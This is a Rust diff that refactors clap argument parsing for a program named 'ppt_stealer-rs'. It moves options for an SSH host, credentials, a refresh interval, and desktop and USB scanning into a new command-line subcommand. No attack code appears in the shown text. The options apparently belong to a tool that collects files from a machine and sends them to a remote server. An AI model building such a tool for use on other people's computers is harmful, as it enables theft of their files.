@@ -1,4 +1,4 @@
-use clap::{ArgGroup, Args, Parser, ValueEnum};
+use clap::{ArgGroup, Args, Parser, Subcommand, ValueEnum};
 
 #[derive(Parser, Debug)]
 #[command(name = "ppt_stealer-rs", version)]
@@ -12,50 +12,10 @@ use clap::{ArgGroup, Args, Parser, ValueEnum};
 {all-args}
 
 {after-help}")]
-#[command(group(
-    ArgGroup::new("auth")
-        .args(&["password", "key_auth"])
-        .required(false)
-        .multiple(false)
-))]
+
 pub struct Cli {
-    #[arg(short = 'i', long, help = "SSH IP address or domain")]
-    ip: Option<String>,
-
-    #[arg(short = 'p', long, help = "SSH IP port")]
-    port: Option<i64>,
-
-    #[arg(short = 'u', long, help = "SSH username")]
-    username: Option<String>,
-
-    #[arg(short = 'P', long, group = "auth", help = "SSH password")]
-    password: Option<String>,
-
-    #[arg(
-        long,
-        default_value_t = false,
-        group = "auth",
-        next_line_help = true,
-        help = "Use SSH key authentication. If not assigned, password authentication will be used."
-    )]
-    key_auth: bool,
-
-    #[arg(long, default_value_t = 30, help = "Refresh interval in seconds")]
-    refresh_interval: u64,
-
-    #[arg(
-        long,
-        default_value_t = false,
-        help = "Assign no GUI mode",
-        default_value_t = true
-    )]
-    no_gui: bool,
-
-    #[arg(long, help = "Scan additional folder for files.")]
-    remote_folder_name: Option<String>,
-
-    #[arg(long, help = "Scan USB for files.")]
-    usb: bool,
+    #[command(subcommand)]
+    pub command: Option<Commands>,
 
     #[arg(
         value_enum,
@@ -64,14 +24,11 @@ pub struct Cli {
         next_line_help = true,
         help = "Debug level.",
         default_value_t = DebugLevel::Info)]
-    debug_level: DebugLevel,
-
-    #[command(flatten)]
-    scan_params: ScanParams,
+    pub debug_level: DebugLevel,
 }
 
 #[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
-enum DebugLevel {
+pub enum DebugLevel {
     Trace,
     Debug,
     Info,
@@ -79,9 +36,57 @@ enum DebugLevel {
     Error,
 }
 
+#[derive(Subcommand, Debug)]
+pub enum Commands {
+    /// Start the slint GUI application.
+    Gui,
+    /// Start the command-line interface.
+
+    #[command(group(
+        ArgGroup::new("auth")
+            .args(&["password", "key_auth"])
+            .required(false)
+            .multiple(false)
+    ))]
+    NoGui {
+        #[arg(short = 'i', long, help = "SSH IP address or domain")]
+        ip: String,
+
+        #[arg(short = 'p', long, help = "SSH IP port", default_value_t = 22)]
+        port: i64,
+
+        #[arg(short = 'u', long, help = "SSH username")]
+        username: String,
+
+        #[arg(short = 'P', long, group = "auth", help = "SSH password")]
+        password: Option<String>,
+
+        #[arg(
+            long,
+            default_value_t = false,
+            group = "auth",
+            next_line_help = true,
+            help = "Use SSH key authentication. If not assigned, password authentication will be used."
+        )]
+        key_auth: bool,
+
+        #[arg(long, default_value_t = 30, help = "Refresh interval in seconds")]
+        refresh_interval: u64,
+
+        #[arg(long, help = "Scan additional folder for files.")]
+        remote_folder_name: Option<String>,
+
+        #[arg(long, help = "Scan USB for files.")]
+        usb: bool,
+
+        #[command(flatten)]
+        scan_params: ScanParams,
+    },
+}
+
 #[derive(Args, Debug, Clone)]
 #[group(required = false, multiple = true)]
-struct ScanParams {
+pub struct ScanParams {
     #[arg(long, help = "Custimised desktop path")]
     desktop_path: Option<String>,
 
